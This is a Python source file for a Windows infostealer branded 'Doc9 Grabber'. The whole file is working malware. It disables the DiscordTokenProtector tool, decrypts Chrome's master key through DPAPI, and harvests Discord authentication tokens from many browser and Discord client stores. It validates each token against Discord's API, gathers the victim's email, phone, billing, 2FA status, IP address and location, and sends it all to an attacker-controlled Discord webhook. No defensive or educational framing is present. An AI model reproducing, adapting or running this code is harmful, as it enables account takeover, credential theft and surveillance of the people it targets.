import os
import json
import base64
import requests
import platform as plt
import winreg
import shutil
import sqlite3
import win32crypt

from win32crypt import CryptUnprotectData
from re import findall
from urllib.request import urlopen,Request
from Crypto.Cipher import AES
from datetime import datetime , timedelta
from json import loads, dumps
from discord_webhook import DiscordWebhook

from discord import RequestsWebhookAdapter, Webhook


weblink = "WebHook_Here"


def getheaders(token=None, content_type="application/json"):
        headers = {
                "Content-Type": content_type,
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        }
        if token:
            headers.update({"Authorization": token})
        return headers
def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception as e:
        USERNAME = "None"
    return USERNAME

def my_chrome_datetime(time_in_mseconds):
    return datetime(1601, 1, 1) + timedelta(microseconds=time_in_mseconds)

def encryption_key():
    localState_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(localState_path, "r", encoding="utf-8") as file:
        local_state_file = file.read()
        local_state_file = json.loads(local_state_file)
    ASE_key = base64.b64decode(local_state_file["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(ASE_key, None, None, None, 0)[1]

class main():
    def __init__(self):

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Peg_Grabber"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []
        
        self.main()
    
    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except Exception:
                pass 
        try:
            with open(config) as f:
                item = json.load(f)
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)


        except Exception:
            pass
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def getProductKey(self, path: str = r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
        def strToInt(x):
            if isinstance(x, str):
                return ord(x)
            return x
        chars = 'BCDFGHJKMPQRTVWXY2346789'
        wkey = ''
        offset = 52
        regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,path)
        val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
        productName, _ = winreg.QueryValueEx(regkey, "ProductName")
        key = list(val)

        for i in range(24,-1, -1):
            temp = 0
            for j in range(14,-1,-1):
                temp *= 256
                try:
                    temp += strToInt(key[j+ offset])
                except IndexError:
                    return [productName, ""]
                if temp / 24 <= 255:
                    key[j+ offset] = temp/24
                else:
                    key[j+ offset] = 255
                temp = int(temp % 24)
            wkey = chars[temp] + wkey
        for i in range(5,len(wkey),6):
            wkey = wkey[:i] + '-' + wkey[i:]
        return [productName, wkey]
        
    def main(self):
        global token
        
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        
        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = None
                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                
                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
                                    
        




        url = 'http://ipinfo.io/json'
        response = urlopen(url)
        data = json.load(response)
        ip = data['ip']
        org = data['org']
        loc = data['loc']
        city = data['city']
        country = data['country']
        region = data['region']
        googlemap = "https://www.google.com/maps/search/google+map++" + loc

        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")

        for token in self.tokens:                     
            headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
            

            r = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
            if r.status_code == 200:
                r_json = r.json()
                username = f'{r_json["username"]}#{r_json["discriminator"]}'
                user_id = r_json['id']
                avatar_id = r_json['avatar']
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                phone = r_json['phone']
                verified = r_json['verified']
                email = r_json['email']
                mfa_enabled = r_json['mfa_enabled']
            try:
                nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
            except Exception:
                pass
            nitro = False
            nitro = bool(len(nitro_data) > 0)
            try:
                billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
            except Exception:
                pass
            creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            computer_os = plt.platform()

        webhook = Webhook.from_url(weblink, adapter=RequestsWebhookAdapter())
        tokens = self.tokens
        embeds = []
        embed = {
                    "color": 0xaeFe2,
                    "fields": [
                        {
                            "name": "**Account information**",
                            "value": f'`E-mail:` {email}\n`Phone number:` {phone}\n`Nitro:` {nitro}\n`Billing Info:` {billing}'
                        },
                        {
                            "name": "**PC information**",
                            "value": f'`Operating System:` {computer_os}\n`PC name:` {pc_username}\n`PC ID:` {pc_name}'
                        },
                        {
                            "name": "**IP information**",
                            "value": f'`IP:` {ip}\n`Country:` {country}\n`City:` {city}\n`Region:` {region}\n`Geo:` [{loc}]({googlemap})'
                        },
                        {
                            "name": "**Other information**",
                            "value": f'`E-mail Verification:` {verified}\n`2FA/MFA Activated:` {mfa_enabled}\n`Creation Date:` {creation_date}'
                        },
                        {
                            "name": "**Token**",
                            "value": f'```{tokens}```'
                        },
                        {
                            "name": "**doc9 Grabber**",
                            "value": f'```NEW Account Reported! | {username}```'
                        },
                    ],
                    "author": {
                        "name": f"Username: {username}  |  User ID: {user_id}",
                        "icon_url": avatar_url
                    },
                    "footer": {
                        "text": f"Made By 𝐈𝐬𝐢𝐬#4209"
                    }
                }
        embeds.append(embed)

        webhook = DiscordWebhook(url=weblink, username="Doc 9 Grabber",avatar_url="https://cdn.discordapp.com/attachments/985557747099652126/1006677752822370435/unknown.png") #CHANGE ME!!!
        response = webhook.execute()


        webhook = {
		"content": "",
		"embeds": embeds,
		"username": "Doc9 Logger",
		"avatar_url": "https://cdn.discordapp.com/attachments/985557747099652126/1006677752822370435/unknown.png"
	    }
        try:
            urlopen(Request(weblink, data=dumps(webhook).encode(), headers=getheaders()))
        except:
            pass
        
        
main()